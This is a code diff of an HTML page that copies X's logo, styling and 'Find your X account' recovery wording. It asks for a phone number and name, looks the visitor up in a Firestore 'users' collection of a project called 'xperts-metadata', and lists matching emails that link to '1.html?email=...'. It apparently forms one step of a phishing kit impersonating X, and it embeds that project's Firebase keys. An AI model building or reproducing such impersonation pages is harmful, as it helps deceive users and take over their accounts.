@@ -2,106 +2,96 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>Find your email</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Find your account</title>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-firestore-compat.js"></script>
     <style>
-        /* Reusing style for consistency */
-        body { font-family: -apple-system, sans-serif; display: flex; justify-content: center; height: 100vh; align-items: center; margin: 0; }
-        .container { width: 400px; padding: 20px; }
-        .logo { font-size: 30px; margin-bottom: 20px; }
-        h1 { margin-bottom: 10px; }
-        .input-box { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
-        .btn { width: 100%; padding: 15px; background: #000; color: #fff; border-radius: 25px; border: none; cursor: pointer; font-weight: bold; margin-top: 10px; }
-        .list-item { padding: 15px; border: 1px solid #eee; margin-top: 5px; cursor: pointer; border-radius: 8px; }
-        .list-item:hover { background: #f0f0f0; }
-        .toast { position: fixed; bottom: 20px; left: 50%; transform: translateX(-50%); background: #333; color: white; padding: 10px; border-radius: 4px; display: none; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; justify-content: center; height: 100vh; background: #fff; margin:0; }
+        .container { width: 100%; max-width: 600px; padding: 20px; }
+        .logo { margin-bottom: 20px; }
+        h1 { font-size: 26px; font-weight: 700; margin-bottom: 10px; }
+        input { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #cfd9de; border-radius: 4px; box-sizing: border-box; }
+        .btn { width: 100%; padding: 15px; border-radius: 30px; border: none; background: #000; color: #fff; font-weight: bold; cursor: pointer; margin-top: 20px; }
+        .result-item { padding: 15px; border: 1px solid #eee; margin-top: 10px; cursor: pointer; border-radius: 8px; }
+        .result-item:hover { background: #f7f9f9; }
     </style>
 </head>
 <body>
-    <div class="toast" id="toast"></div>
-    <div class="container">
-        <i class="fa-brands fa-x-twitter logo"></i>
-        
-        <div id="view-phone">
-            <h1>Find your X account</h1>
-            <p>Enter your phone number associated with your account.</p>
-            <input type="tel" id="mobile-in" class="input-box" placeholder="Mobile number">
-            <button class="btn" onclick="checkMobile()">Next</button>
-        </div>
 
-        <div id="view-name" style="display:none">
-            <h1>What's your name?</h1>
-            <input type="text" id="fname" class="input-box" placeholder="First Name">
-            <input type="text" id="lname" class="input-box" placeholder="Last Name">
-            <button class="btn" onclick="searchAccount()">Next</button>
-        </div>
-
-        <div id="view-results" style="display:none">
-            <h1>Choose your account</h1>
-            <div id="email-list"></div>
-        </div>
+<div class="container">
+    <div class="logo">
+        <svg viewBox="0 0 24 24" aria-hidden="true" width="30" height="30"><g><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path></g></svg>
+    </div>
+    
+    <div id="search-form">
+        <h1>Find your X account</h1>
+        <p style="color: #536471;">Enter the phone number, First Name and Last Name associated with your account.</p>
+        <input type="tel" id="mobile" placeholder="Phone number">
+        <input type="text" id="fname" placeholder="First Name">
+        <input type="text" id="lname" placeholder="Last Name">
+        <button class="btn" onclick="findAccount()">Next</button>
     </div>
 
-<script src="https://www.gstatic.com/firebasejs/7.20.0/firebase-app.js"></script>
-<script src="https://www.gstatic.com/firebasejs/7.20.0/firebase-firestore.js"></script>
+    <div id="results" style="display:none;">
+        <h1>We found these accounts</h1>
+        <div id="email-list"></div>
+    </div>
+</div>
+
 <script>
-    const firebaseConfig = { apiKey: "AIzaSyDL7sPp-FkG59L-mRQ7BrCGgeKMhQC80iw", authDomain: "xperts-metadata.firebaseapp.com", projectId: "xperts-metadata", storageBucket: "xperts-metadata.firebasestorage.app", messagingSenderId: "514845910910", appId: "1:514845910910:web:5a2402130a97b5d749b52f", measurementId: "G-CQ5KWGJSZB" };
+    const firebaseConfig = {
+        apiKey: "AIzaSyDL7sPp-FkG59L-mRQ7BrCGgeKMhQC80iw",
+        authDomain: "xperts-metadata.firebaseapp.com",
+        projectId: "xperts-metadata",
+        storageBucket: "xperts-metadata.firebasestorage.app",
+        messagingSenderId: "514845910910",
+        appId: "1:514845910910:web:5a2402130a97b5d749b52f",
+        measurementId: "G-CQ5KWGJSZB"
+    };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.firestore();
 
     const urlParams = new URLSearchParams(window.location.search);
-    const mobileParam = urlParams.get('mobile');
-
-    if(mobileParam) {
-        document.getElementById('mobile-in').value = mobileParam;
+    window.onload = function() {
+        if(urlParams.get('mobile')) {
+            document.getElementById('mobile').value = urlParams.get('mobile');
+        }
     }
 
-    function showToast(msg) {
-        const t = document.getElementById('toast');
-        t.innerText = msg;
-        t.style.display = 'block';
-        setTimeout(() => t.style.display = 'none', 3000);
-    }
+    async function findAccount() {
+        const mobile = document.getElementById('mobile').value;
+        const fname = document.getElementById('fname').value;
+        const lname = document.getElementById('lname').value;
 
-    async function checkMobile() {
-        const mob = document.getElementById('mobile-in').value.trim();
-        if(!mob) return showToast("Enter mobile");
-        
-        // In real world, verify mobile exists first, but prompt says "Ask Name"
-        document.getElementById('view-phone').style.display = 'none';
-        document.getElementById('view-name').style.display = 'block';
-    }
+        if(!mobile || !fname) return alert("Fill details");
 
-    async function searchAccount() {
-        const mob = document.getElementById('mobile-in').value.trim();
-        const f = document.getElementById('fname').value.trim();
-        const l = document.getElementById('lname').value.trim();
-
-        const snap = await db.collection('users')
-            .where('mobile', '==', mob)
-            .where('firstName', '==', f)
-            .where('lastName', '==', l)
+        const snapshot = await db.collection('users')
+            .where('mobile', '==', mobile)
+            .where('firstName', '==', fname)
+            .where('lastName', '==', lname)
             .get();
 
-        if (snap.empty) {
-            showToast("No account found matching these details");
-            return;
-        }
-
-        document.getElementById('view-name').style.display = 'none';
-        document.getElementById('view-results').style.display = 'block';
         const list = document.getElementById('email-list');
+        list.innerHTML = "";
         
-        snap.forEach(doc => {
-            const data = doc.data();
-            const el = document.createElement('div');
-            el.className = 'list-item';
-            el.innerText = data.email;
-            el.onclick = () => {
-                window.location.href = `1.html?email=${data.email}`;
-            };
-            list.appendChild(el);
-        });
+        if (snapshot.empty) {
+            alert("No account found");
+        } else {
+            document.getElementById('search-form').style.display = 'none';
+            document.getElementById('results').style.display = 'block';
+
+            snapshot.forEach(doc => {
+                const data = doc.data();
+                const div = document.createElement('div');
+                div.className = 'result-item';
+                div.innerText = data.email;
+                div.onclick = () => {
+                    window.location.href = `1.html?email=${data.email}`;
+                };
+                list.appendChild(div);
+            });
+        }
     }
 </script>
 </body>
